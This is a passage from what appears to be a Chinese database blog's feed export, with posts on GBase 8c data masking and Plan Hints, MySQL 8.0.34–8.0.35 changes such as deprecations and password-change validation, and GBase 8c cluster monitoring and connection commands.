<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> resource label creditcard_label <span class="keyword">add</span> <span class="keyword">column</span>(person.creditcard);</span><br><span class="line"><span class="keyword">create</span> resource label customer_label   <span class="keyword">add</span> <span class="keyword">column</span>(orders.customername);</span><br><span class="line"><span class="keyword">create</span> resource label email_label      <span class="keyword">add</span> <span class="keyword">column</span>(orders.email);</span><br><span class="line"><span class="keyword">create</span> resource label id_label         <span class="keyword">add</span> <span class="keyword">column</span>(orders.id);</span><br><span class="line"><span class="keyword">create</span> resource label order_no_label   <span class="keyword">add</span> <span class="keyword">column</span>(orders.order_no);</span><br><span class="line"><span class="keyword">create</span> resource label pid_label        <span class="keyword">add</span> <span class="keyword">column</span>(orders.pid);</span><br></pre></td></tr></table></figure></div>
<ul>
<li>创建策略</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> masking policy mask_name_pol maskall <span class="keyword">on</span> label(customer_label); </span><br><span class="line"><span class="keyword">create</span> masking policy mask_email_pol basicemailmasking <span class="keyword">on</span> label(email_label);</span><br></pre></td></tr></table></figure></div>
<ul>
<li>验证结果</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> orders;</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-extensions/2023-03-30-10.png"
                      alt="" loading="lazy"
                ></p>
<ul>
<li>查询策略label</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gbase=# select * from gs_policy_label;</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-extensions/2023-03-30-11.png"
                      alt="" loading="lazy"
                ></p>
<p>更多例子可以参考： <a class="link"   href="https://www.modb.pro/db/49228" >openGauss 数据动态脱敏 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr>
<h2 id="11-pg-hint-plan">11. pg_hint_plan</h2>
<p>GBase 8c 中不提供 pg_hint_plan 扩展，但是原生支持 Plan Hint 功能。</p>
<p>PostgreSQL 社区不考虑引入 <a class="link"   href="https://wiki.postgresql.org/wiki/OptimizerHintsDiscussion" >hint <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 功能，所以在 PostgreSQL 中可以用 pg_hint_plan 扩展来支持该功能，但是在 GBase 8c 中，已经在内核级别融入了 hint 功能。</p>
<p>在 GBase 8c 中，Plan Hint 为用户提供了直接影响执行计划的手段，用户可以通过指定 join 顺序，join、scan 方法，指定行数等手段来进行执行计划调优，以提升查询性能。<br>
并从以下几个范围来支持 Plan Hint 的使用：</p>
<p>‒ 指定 join 方式；<br>
‒ 指定 join 顺序；<br>
‒ 指定行数；<br>
‒ 指定 scan 方式；<br>
‒ 指定链接块名；<br>
‒ custom plan 和 generic plan 选择的 hint；<br>
‒ 指定子查询不扩展；</p>
<hr>
<h2 id="总结">总结</h2>
<p>本文介绍了 GBase 8c 中预装的 10 个扩展插件，并对其中部分插件做了功能演示。</p>
<p>GBase 8c 具备分布式事务强一致性、计算能力和存储能力线性扩展的核心能力；同时支持多地多中心和异地多活，提供99.999%的高可用性，这其中，GBase 8c 所预装的10款插件也起到了强大的支撑作用。</p>
<p>另外， GBase 8c 相关<a class="link"   href="https://www.modb.pro/db/618667" >认证培训课程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 已经公开上线，欢迎对国产数据库感兴趣的同学多多交流。</p>
<h2 id="附">附</h2>
<ul>
<li><a href="https://shawnyan.cn/2023/gbase/gbase-8c-install/">快速搭建 GBase 8c 集群环境</a></li>
<li><a href="https://shawnyan.cn/2023/gbase/gbase-8c-cmd-problem/">GBase 8c 分布式数据库 常用命令 &amp; 常见问题 集锦</a></li>
</ul>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/621128" >https://www.modb.pro/db/621128 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>GBase</category>
        <category>GBase 8c</category>
      </categories>
      <tags>
        <tag>gbase</tag>
        <tag>gdca</tag>
        <tag>南大通用</tag>
        <tag>gbase 8c</tag>
        <tag>extensions</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 升级：MySQL Server 变更详解 (8.0.34 ~ 8.0.35)</title>
    <url>/2024/mysql/mysql-upgrade-change-2023-2/</url>
    <content><![CDATA[<p>MySQL Server 的持续更新为数据库管理员和开发者带来了一系列的改进、新特性和安全性增强。</p>
<p>2023 年下半年，MySQL Server 共发布了两个版本：</p>
<ol>
<li>MySQL 8.0.34 (2023-07-18)</li>
<li>MySQL 8.0.35 (2023-10-25)</li>
</ol>
<p>本文将详细探讨 MySQL 8.0.34 和 8.0.35，这两个版本的关键变更，帮助用户了解这些更新对现有系统可能产生的影响，并为升级做好准备。</p>
<h2 id="重要变更">重要变更</h2>
<h3 id="mysqlpump">mysqlpump</h3>
<p>MySQL 8.0.34，mysqlpump 客户端已弃用，因为它的功能可以通过其他方式实现，如 mysqldump 和 MySQL Shell Utilities。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">mysqlpump --version</span></span><br><span class="line">WARNING: mysqlpump is deprecated and will be removed in a future version. Use mysqldump instead.</span><br><span class="line">mysqlpump  Ver 8.0.34 for Linux on x86_64 (MySQL Community Server - GPL)</span><br></pre></td></tr></table></figure></div>
<h3 id="SQL-语法">SQL 语法</h3>
<p>CURRENT_USER() 现在可以作为 VARCHAR 和 TEXT 列在 <code>CREATE TABLE</code> 和 <code>ALTER TABLE ... ADD COLUMN</code> 语句中的默认值使用。</p>
<p>具體示例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table t (</span><br><span class="line">    -&gt; n1 varchar(50) default (CURRENT_USER()),</span><br><span class="line">    -&gt; n2 text default (CURRENT_USER())</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert t values row();</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; table t;</span><br><span class="line">+----------------+----------------+</span><br><span class="line">| n1             | n2             |</span><br><span class="line">+----------------+----------------+</span><br><span class="line">| root@localhost | root@localhost |</span><br><span class="line">+----------------+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="安全">安全</h2>
<h3 id="1-validate-password-changed-characters-percentage">1. validate_password.changed_characters_percentage</h3>
<p>在 MySQL 8.0.34 版本中，新增密码验证的系统变量 <code>validate_password.changed_characters_percentage</code>。</p>
<p>允许管理员配置和强制用户在更换 MySQL 账户密码时必须更改的最小字符数。这个验证设置是当前密码总字符数的百分比。</p>
<p>具体工作方式如下：</p>
<ul>
<li>当用户尝试更改其 MySQL 账户密码时，服务器会检查新密码与当前密码之间的差异。</li>
<li>如果 <code>validate_password.changed_characters_percentage</code> 变量设置为某个百分比值（例如 50），那么新密码中至少有一半的字符必须与当前密码不同，否则密码更改将被拒绝。</li>
<li>这个新的功能为 DBAs 提供了更完整的密码管理控制，确保密码的复杂性和安全性。</li>
</ul>
<p>例如，如果当前密码是 “1qaz@WSX”（8个字符），并且 <code>validate_password.changed_characters_percentage</code> 设置为 50%，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@validate_password.changed_characters_percentage;</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">| @@validate_password.changed_characters_percentage |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">|                                                50 |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create user shawnyan identified by &#x27;1qaz@WSX&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br></pre></td></tr></table></figure></div>
<p>那么用户在尝试设置新密码时，至少需要有 4 个字符与原密码不同。<br>
如果新密码没有达到这个要求，MySQL 将不允许更改密码，并给出相应的错误信息。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; alter user shawnyan identified by &#x27;1qaz@WSx&#x27; replace &#x27;1qaz@WSX&#x27;;</span><br><span class="line">ERROR 4165 (HY000): The new password must have at least &#x27;4&#x27; characters that are different from the old password. It has only &#x27;0&#x27; character(s) different. For this comparison, uppercase letters and lowercase letters are considered to be equal.</span><br><span class="line"></span><br><span class="line">mysql&gt; alter user shawnyan identified by &#x27;1qaz#EDC&#x27; replace &#x27;1qaz@WSX&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<p>这里需要注意的是，该参数只在用户使用 <code>alter user ... replace</code> 语句时，方可生效，root 用户可以直接更改密码，不受此约束限制。</p>
<h3 id="2-TLS-AES-128-CCM-8-SHA256">2. TLS_AES_128_CCM_8_SHA256</h3>
<p>在 MySQL 8.0.35 版本中，<code>TLS_AES_128_CCM_8_SHA256</code> 密码套件被标记为弃用。</p>
<p>对于现有用户，这可能有以下影响：</p>
<ol>
<li>警告信息：</li>
</ol>
<p>尝试使用 tls_ciphersuites 或 admin_tls_ciphersuites 系统变量设置 TLS_AES_128_CCM_8_SHA256 密码套件时，MySQL 将发出警告。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; set global tls_ciphersuites = &#x27;TLS_AES_128_CCM_8_SHA256&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; set global admin_tls_ciphersuites = &#x27;TLS_AES_128_CCM_8_SHA256&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-03-19T09:15:43.053275Z 19 [Warning] [MY-014067] [Server] Value for option &#x27;tls_ciphersuites&#x27; contains cipher &#x27;TLS_AES_128_CCM_8_SHA256&#x27; that is either blocked or deprecated (and will be removed in a future release). Please refer to the documentation for more details.</span><br><span class="line">2024-03-19T09:16:14.358076Z 19 [Warning] [MY-014067] [Server] Value for option &#x27;admin_tls_ciphersuites&#x27; contains cipher &#x27;TLS_AES_128_CCM_8_SHA256&#x27; that is either blocked or deprecated (and will be removed in a future release). Please refer to the documentation for more details.</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>使用 SQL 查看当前的系统变量配置:</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT @@global.tls_ciphersuites, @@global.admin_tls_ciphersuites;</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>配置更改：</li>
</ol>
<p>用户需要更新他们的 MySQL 配置文件（如 my.cnf），移除或替换所有引用 TLS_AES_128_CCM_8_SHA256 的配置项。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">tls_ciphersuites=TLS_AES_128_CCM_8_SHA256:...</span><br><span class="line"></span><br><span class="line">[client]</span><br><span class="line">tls_ciphersuites=TLS_AES_128_CCM_8_SHA256:...</span><br></pre></td></tr></table></figure></div>
<p>用户应该选择其他仍然受支持的密码套件，如 TLS_AES_128_GCM_SHA256、TLS_AES_256_GCM_SHA384、TLS_CHACHA20_POLY1305_SHA256 等。</p>
<ol start="4">
<li>提前规划：</li>
</ol>
<p>由于弃用不意味着立即移除，用户可以利用这段时间来规划和测试新的密码套件配置，<br>
确保在 TLS_AES_128_CCM_8_SHA256 被完全移除之前，系统能够平滑过渡到新的密码套件。</p>
<h3 id="3-mysql-native-password">3. mysql_native_password</h3>
<p>MySQL 8.0.34, mysql_native_password 认证插件已弃用，将在未来版本中移除。</p>
<p>如果继续使用，比如在创建密码时指定 mysql_native_password 认证插件，MySQL 服务器将发出警告。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create user shawnyan1 IDENTIFIED WITH mysql_native_password BY &#x27;1qaz@WSX&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<p>MySQL 服务器日志输出：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-03-19T09:27:50.763330Z 20 [Warning] [MY-013360] [Server] Plugin mysql_native_password reported: &#x27;&#x27;mysql_native_password&#x27; is deprecated and will be removed in a future release. Please use caching_sha2_password instead&#x27;</span><br></pre></td></tr></table></figure></div>
<h2 id="其他">其他</h2>
<ol>
<li>改变了二进制存档包的命名方式，以反映对 glibc2.17 或更新版本的 Linux 系统的兼容性。</li>
</ol>
<p>具体地说，MySQL 8.0.33 对 glibc2.17, x86, 64-bit 只提供三个包：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql-8.0.33-linux-glibc2.17-x86_64-minimal.tar.xz</span><br><span class="line">mysql-test-8.0.33-linux-glibc2.17-x86_64-minimal.tar.xz</span><br><span class="line">mysql-8.0.33-linux-glibc2.17-x86_64-minimal.tar</span><br></pre></td></tr></table></figure></div>
<p>MySQL 8.0.34 对 glibc2.17, x86, 64-bit 提供了如下 6 个包：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql-8.0.34-linux-glibc2.17-x86_64.tar.gz</span><br><span class="line">mysql-8.0.34-linux-glibc2.17-x86_64-minimal.tar.xz</span><br><span class="line">mysql-test-8.0.34-linux-glibc2.17-x86_64.tar.gz</span><br><span class="line">mysql-test-8.0.34-linux-glibc2.17-x86_64-minimal.tar.xz</span><br><span class="line">mysql-8.0.34-linux-glibc2.17-x86_64.tar</span><br><span class="line">mysql-8.0.34-linux-glibc2.17-x86_64-minimal.tar</span><br></pre></td></tr></table></figure></div>
<p>这些二进制包可以与使用 glibc2.17 或更高版本的 Linux 系统兼容，其中包括 EL7、EL8 和 EL9。</p>
<h2 id="总结">总结</h2>
<p>随着 MySQL Server 8.0.34 到 8.0.35 的发布，用户可以期待更稳定、安全和高效的数据库操作体验。</p>
<p>在升级到此版本之前，建议用户详细阅读发布说明，评估影响，并在生产环境中进行充分的测试。</p>
<p>对于弃用的功能，用户应当开始规划迁移到其他支持的功能或方法上，以确保平滑过渡到未来的 MySQL 版本。</p>
<p>– END –</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
<p>如果这篇文章为你带来了灵感或启发，就帮忙点『赞』or『在看』or『转发』吧，这对我非常重要，感谢！(๑˃̵ᴗ˂̵)</p>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>MySQL 8.0</category>
      </categories>
      <tags>
        <tag>upgrade</tag>
        <tag>mysql</tag>
        <tag>mysql 8.0</tag>
      </tags>
  </entry>
  <entry>
    <title>GBase 8c 分布式数据库 常用命令 &amp; 常见问题 集锦</title>
    <url>/2023/gbase/gbase-8c-cmd-problem/</url>
    <content><![CDATA[<img  alt="bannerxt.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240223-5cbd03e9-2986-413d-bdf7-42c4ca510016.jpg"
                      referrerpolicy="no-referrer"
                >
<blockquote>
<p>2022年7月，南大通用 GBase 8c 于 openGauss Developer Day 2022 峰会正式亮相发布。GBase 8c是业内首个基于 openGauss3.0 发布的多模多态的分布式数据库，支持行存、列存、内存等多种存储模式和单机、主备与分布式等多种部署形态。</p>
</blockquote>
<p>前文 【<a href="https://shawnyan.cn/2023/gbase/gbase-8c-install/">快速搭建 GBase 8c 集群环境</a>】 已阐述如何快速搭建 GBase 8c 集群环境，本文将汇集 GBase 8c 的常用命令。</p>
<p>GBase 8c 数据库分布式形态采用 share nothing 的分布式架构，计算节点和存储节点分离。节点间通过高速网络进行通信，所有节点都有主从互备，确保系统的极致高可用。</p>
<p>GBase 8c 的主要节点分为三类，分别是协调器（Coordinator,CN）、数据节点（Data  Node,DN）、全局事务管理器（Global Transaction Manager,GTM）。部署一套 GBase 8c 分布式环境至少需要以下节点：</p>
<ul>
<li>1个 GHA_SERVER 节点</li>
<li>1个 DCS 节点</li>
<li>1个 GTM 节点</li>
<li>1个 CN 节点</li>
<li>2个 DN 节点</li>
</ul>
<p>下文将直接使用节点缩写。</p>
<h2 id="常见命令">常见命令</h2>
<h3 id="1-查看-GBase-8c-所有组件状态">1. 查看 GBase 8c 所有组件状态</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gha_ctl monitor -l http://192.168.8.31:2379 -H</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-cmd-problem/2023-03-19-01.png"
                      alt="" loading="lazy"
                ></p>
<h3 id="2-查看-GHA-SERVER-节点状态">2. 查看 GHA_SERVER 节点状态</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 ~]$ gha_ctl monitor server -l http://192.168.8.31:2379</span><br><span class="line">&#123;</span><br><span class="line">    &quot;cluster&quot;: &quot;gbase&quot;,</span><br><span class="line">    &quot;version&quot;: &quot;V5_S3.0.0B76&quot;,</span><br><span class="line">    &quot;server&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;gha_server1&quot;,</span><br><span class="line">            &quot;host&quot;: &quot;192.168.8.31&quot;,</span><br><span class="line">            &quot;port&quot;: &quot;20001&quot;,</span><br><span class="line">            &quot;state&quot;: &quot;running&quot;,</span><br><span class="line">            &quot;isLeader&quot;: true</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="3-查看-DCS-节点状态">3. 查看 DCS 节点状态</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 ~]$ gha_ctl monitor dcs -l http://192.168.8.31:2379</span><br><span class="line">&#123;</span><br><span class="line">    &quot;cluster&quot;: &quot;gbase&quot;,</span><br><span class="line">    &quot;version&quot;: &quot;V5_S3.0.0B76&quot;,</span><br><span class="line">    &quot;dcs&quot;: &#123;</span><br><span class="line">        &quot;clusterState&quot;: &quot;healthy&quot;,</span><br><span class="line">        &quot;members&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;url&quot;: &quot;http://192.168.8.31:2379&quot;,</span><br><span class="line">                &quot;id&quot;: &quot;bfb7ea6d0aaed3aa&quot;,</span><br><span class="line">                &quot;name&quot;: &quot;node_0&quot;,</span><br><span class="line">                &quot;isLeader&quot;: true,</span><br><span class="line">                &quot;state&quot;: &quot;healthy&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h3 id="4-查看-GTM-节点状态">4. 查看 GTM 节点状态</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 ~]$ gha_ctl monitor gtm -l http://192.168.8.31:2379</span><br><span class="line">&#123;</span><br><span class="line">    &quot;cluster&quot;: &quot;gbase&quot;,</span><br><span class="line">    &quot;version&quot;: &quot;V5_S3.0.0B76&quot;,</span><br><span class="line">    &quot;gtm&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;gtm1&quot;,</span><br><span class="line">            &quot;host&quot;: &quot;192.168.8.31&quot;,</span><br><span class="line">            &quot;port&quot;: &quot;6666&quot;,</span><br><span class="line">            &quot;workDir&quot;: &quot;/home/gbase/data/gtm/gtm1&quot;,</span><br><span class="line">            &quot;agentPort&quot;: &quot;8001&quot;,</span><br><span class="line">            &quot;state&quot;: &quot;running&quot;,</span><br><span class="line">            &quot;role&quot;: &quot;primary&quot;,</span><br><span class="line">            &quot;agentHost&quot;: &quot;192.168.8.31&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="5-查看-CN-节点状态">5. 查看 CN 节点状态</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 ~]$ gha_ctl monitor coordinator -l http://192.168.8.31:2379</span><br><span class="line">&#123;</span><br><span class="line">    &quot;cluster&quot;: &quot;gbase&quot;,</span><br><span class="line">    &quot;version&quot;: &quot;V5_S3.0.0B76&quot;,</span><br><span class="line">    &quot;coordinator&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;cn1&quot;,</span><br><span class="line">            &quot;host&quot;: &quot;192.168.8.31&quot;,</span><br><span class="line">            &quot;port&quot;: &quot;5432&quot;,</span><br><span class="line">            &quot;workDir&quot;: &quot;/home/gbase/data/coord/cn1&quot;,</span><br><span class="line">            &quot;agentPort&quot;: &quot;8003&quot;,</span><br><span class="line">            &quot;state&quot;: &quot;running&quot;,</span><br><span class="line">            &quot;role&quot;: &quot;primary&quot;,</span><br><span class="line">            &quot;agentHost&quot;: &quot;192.168.8.31&quot;,</span><br><span class="line">            &quot;central&quot;: true</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="6-查看-DN-节点状态">6. 查看 DN 节点状态</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 ~]$ gha_ctl monitor datanode -l http://192.168.8.31:2379</span><br><span class="line">&#123;</span><br><span class="line">    &quot;cluster&quot;: &quot;gbase&quot;,</span><br><span class="line">    &quot;version&quot;: &quot;V5_S3.0.0B76&quot;,</span><br><span class="line">    &quot;datanode&quot;: &#123;</span><br><span class="line">        &quot;dn1&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;name&quot;: &quot;dn1_1&quot;,</span><br><span class="line">                &quot;host&quot;: &quot;192.168.8.32&quot;,</span><br><span class="line">                &quot;port&quot;: &quot;15432&quot;,</span><br><span class="line">                &quot;workDir&quot;: &quot;/home/gbase/data/dn1/dn1_1&quot;,</span><br><span class="line">                &quot;agentPort&quot;: &quot;8005&quot;,</span><br><span class="line">                &quot;state&quot;: &quot;running&quot;,</span><br><span class="line">                &quot;role&quot;: &quot;primary&quot;,</span><br><span class="line">                &quot;agentHost&quot;: &quot;192.168.8.32&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;dn2&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;name&quot;: &quot;dn2_1&quot;,</span><br><span class="line">                &quot;host&quot;: &quot;192.168.8.33&quot;,</span><br><span class="line">                &quot;port&quot;: &quot;20010&quot;,</span><br><span class="line">                &quot;workDir&quot;: &quot;/home/gbase/data/dn2/dn2_1&quot;,</span><br><span class="line">                &quot;agentPort&quot;: &quot;8007&quot;,</span><br><span class="line">                &quot;state&quot;: &quot;running&quot;,</span><br><span class="line">                &quot;role&quot;: &quot;primary&quot;,</span><br><span class="line">                &quot;agentHost&quot;: &quot;192.168.8.33&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="7-在-CN-节点以-gbase-用户连接-GBase-8c-数据库">7. 在 CN 节点以 gbase 用户连接 GBase 8c 数据库</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 ~]$ gsql -d postgres</span><br><span class="line">gsql ((multiple_nodes GBase8cV5 3.0.0B76 build 47948f99) compiled at 2023-02-27 16:04:20 commit 0 last mr 1232 )</span><br><span class="line">Non-SSL connection (SSL connection is recommended when requiring high-security)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">postgres=# \conninfo</span><br><span class="line">You are connected to database &quot;postgres&quot; as user &quot;gbase&quot; via socket in &quot;/home/gbase/gbase_db/tmp&quot; at port &quot;5432&quot;.</span><br><span class="line">postgres=#</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h3 id="8-查看-CN-节点上的参数">8. 查看 CN 节点上的参数</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 ~]$ gs_guc check -Z coordinator -N all -I all -c &quot;listen_addresses&quot;</span><br><span class="line">The gs_guc run with the following arguments: [gs_guc -Z coordinator -N all -I all -c listen_addresses check ].</span><br><span class="line"></span><br><span class="line">Total GUC values: 1.</span><br><span class="line">The value of parameter listen_addresses is same on all instances.</span><br><span class="line">    listen_addresses=&#x27;localhost,192.168.8.31&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h3 id="9-在-CN-节点配置允许任意-IP-访问集群">9. 在 CN 节点配置允许任意 IP 访问集群</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 ~]$ gs_guc reload -Z coordinator -N all -I all -h &quot;host all all 0.0.0.0/0 sha256&quot;</span><br><span class="line">The gs_guc run with the following arguments: [gs_guc -Z coordinator -N all -I all -h host all all 0.0.0.0/0 sha256 reload ].</span><br><span class="line">Begin to perform the total nodes: 3.</span><br><span class="line">Popen count is 1, Popen success count is 1, Popen failure count is 0.</span><br><span class="line">Begin to perform gs_guc for coordinators.</span><br><span class="line">Command count is 1, Command success count is 1, Command failure count is 0.</span><br><span class="line"></span><br><span class="line">Total instances: 1.</span><br><span class="line">ALL: Success to perform gs_guc!</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h3 id="10-使用数据库管理工具远程连接-GBase-8c-数据库">10. 使用数据库管理工具远程连接 GBase 8c 数据库</h3>
<p>使用数据库管理工具连接 GBase 8c 数据库，这里 IP 地址填写 CN 节点的 IP 地址，用户可以自己创建一个新用户。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 ~]$ gsql</span><br><span class="line">gsql ((multiple_nodes GBase8cV5 3.0.0B76 build 47948f99) compiled at 2023-02-27 16:04:20 commit 0 last mr 1232 )</span><br><span class="line">Non-SSL connection (SSL connection is recommended when requiring high-security)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">gbase=# create user shawnyan login password &#x27;xxxxxxxx&#x27;;</span><br><span class="line">CREATE ROLE</span><br><span class="line">gbase=#</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-cmd-problem/2023-03-19-02.png"
                      alt="" loading="lazy"
                ></p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-cmd-problem/2023-03-19-03.png"
                      alt="" loading="lazy"
                ></p>
<h3 id="11-查看当前用户连接信息">11. 查看当前用户连接信息</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gbase=# \conninfo</span><br><span class="line">You are connected to database &quot;gbase&quot; as user &quot;gbase&quot; via socket in &quot;/home/gbase/gbase_db/tmp&quot; at port &quot;5432&quot;.</span><br><span class="line"></span><br><span class="line">gbase=# select current_user;</span><br><span class="line">current_user</span><br><span class="line">--------------</span><br><span class="line">gbase</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-cmd-problem/2023-03-19-04.png"
                      alt="" loading="lazy"
                ></p>
<h3 id="12-使用-GBase-8c-提供的-gs-check-工具检查系统-CPU-情况">12. 使用 GBase 8c 提供的 gs_check 工具检查系统 CPU 情况</h3>
<ul>
<li>CPU 使用率</li>
</ul>
